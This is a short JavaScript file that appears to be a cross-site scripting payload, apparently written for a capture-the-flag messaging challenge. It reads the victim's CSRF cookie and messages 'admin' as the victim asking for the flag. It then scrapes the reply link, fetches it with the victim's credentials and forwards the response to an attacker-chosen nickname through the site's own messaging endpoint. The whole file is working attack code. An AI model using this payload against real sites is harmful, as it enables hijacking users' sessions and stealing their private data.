function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0) === ' ') {
            c = c.substring(1,c.length);
        }
        if (c.indexOf(nameEQ) === 0) {
            return c.substring(nameEQ.length,c.length);
        }
    }
    return null;
}

function sleepFor(sleepDuration){
    return new Promise(resolve => setTimeout(resolve, sleepDuration));
}

function getUrl(url, nick) {
  var XHR = new XMLHttpRequest();
  var urlEncodedData = "";
  var urlEncodedDataPairs = [];
  var name;

  XHR.addEventListener('load', function(event) {
       	sendMessageToSomeone(true, nick, XHR.responseText);
  });

  XHR.addEventListener('error', function(event) {
       sendMessageToSomeone(true, nick, XHR.responseText);
  });

  XHR.open('GET', url);

  XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

  XHR.send(urlEncodedData);
}

function sendMessageToSomeone(sendToSeba, sebasNickname, content) {
  var XHR = new XMLHttpRequest();
  var urlEncodedData = "";
  if (sendToSeba) {
    urlEncodedData = "username=" + sebasNickname+ "&content=" + encodeURIComponent(content) + "&csrfmiddlewaretoken="+readCookie("csrftoken");
  } else {
    urlEncodedData = "username=admin&content=dej+flage&csrfmiddlewaretoken="+readCookie("csrftoken");
  }
  var urlEncodedDataPairs = [];
  var name;

  XHR.addEventListener('load', function(event) {
       if (!sendToSeba) {
              sendMessageToSomeone(true, sebasNickname, "Rozpoczynam!");
              var re = new RegExp('<a href="(reply/.*)">.*</a>');
              var url = "/" + re.exec(XHR.responseText)[1];
	      sendMessageToSomeone(true, sebasNickname, url);
              sleepFor(5000);
              sendMessageToSomeone(true, sebasNickname, "Wyspany!");
              getUrl(url, sebasNickname);
       };
  });

  XHR.addEventListener('error', function(event) {
        if (!sendToSeba) 
       		sendMessageToSomeone(true, sebasNickname, XHR.responseText);
  });

  XHR.open('POST', '/send_message');

  XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

  XHR.withCredentials = true;
  XHR.send(urlEncodedData);
}

sendMessageToSomeone(false, "Jolanta", "");
